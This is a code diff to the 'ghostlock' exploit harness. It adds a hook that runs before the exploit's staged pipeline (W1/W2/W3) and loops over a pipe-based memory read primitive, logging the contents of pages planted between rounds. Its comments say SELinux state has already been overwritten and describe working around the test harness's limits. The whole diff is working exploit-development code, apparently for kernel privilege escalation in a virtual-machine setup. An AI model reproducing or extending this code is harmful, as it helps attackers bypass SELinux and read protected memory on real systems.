@@ -12,15 +12,63 @@
 
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 
+#include "pipe_daemon.h"
 #include "session/exploit_stages.hpp"
 
 using namespace ghostlock;
+
+/* Prototype hook: the pipe-substitution shot, run *before* the stage pipeline.
+ * Once selinux_state has been written, the pipeline's own pre-W1 stages bail out
+ * (measured: status 0x7f00 every round after the first), which would starve a
+ * shot placed inside them.  This is sticky: every round writes a fresh 9-byte
+ * window into the daemon's primitive pipe and reads 8 bytes back, so whenever
+ * the host plants bufs[i].page between rounds, the next read reports the planted
+ * page's content in the serial log. */
+static int pipe_shot_only(void) {
+    const char *want_s = getenv("GHOSTLOCK_PIPE_SHOT_READ");
+    const long want = want_s ? atol(want_s) : 8;
+    static const char filler[9] = {'G','L','P','I','P','E','S','L','T'};
+    char reply[4096];
+
+    if (pipe_daemon::ensure() != 0) {
+        fprintf(stderr, "pipe shot: daemon unavailable\n");
+        return 1;
+    }
+    /* Loop inside this process: the harness only ever executes the freshly
+     * staged binary in round 1 (later rounds fall back to a missing path and die
+     * with status 0x7f00), and its 20 s watchdog only logs, so this is the one
+     * place a guest-side read can be repeated while the host plants between
+     * iterations. */
+    const long gap = getenv("GHOSTLOCK_PIPE_SHOT_LOOP")
+            ? atol(getenv("GHOSTLOCK_PIPE_SHOT_LOOP")) : 8;
+    const long armlen = getenv("GHOSTLOCK_PIPE_SHOT_LEN")
+            ? atol(getenv("GHOSTLOCK_PIPE_SHOT_LEN")) : 9;
+    for (int i = 1;; i++) {
+        if (pipe_daemon::request_hex("W", reinterpret_cast<const uint8_t *>(filler),
+                                     sizeof(filler), reply, sizeof(reply)) == 0)
+            fprintf(stderr, "pipe shot %d: W -> %s", i, reply);
+        else
+            fprintf(stderr, "pipe shot %d: W failed\n", i);
+        pipe_daemon::prim_arm((size_t) armlen, 0);
+        if (pipe_daemon::prim_read((size_t) want, reply, sizeof(reply)) == 0)
+            fprintf(stderr, "pipe shot %d READ: %s", i, reply);
+        else
+            fprintf(stderr, "pipe shot %d: read failed\n", i);
+        fflush(stderr);
+        fflush(stdout);
+        if (gap <= 0) break;
+        sleep((unsigned) gap);
+    }
+    return 0;
+}
 
 /* Decoupling plan: native executable adapter and W1/W2/W3 orchestration.
  * Inputs: argc/argv plus the process-level session; output: stable exit code.
  * Argument parsing stays here; the stage sequence only owns the session. */
 int main(int argc, char **argv) {
+    if (getenv("GHOSTLOCK_PIPE_SHOT_ONLY")) return pipe_shot_only();
     const char *profile_path = nullptr;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
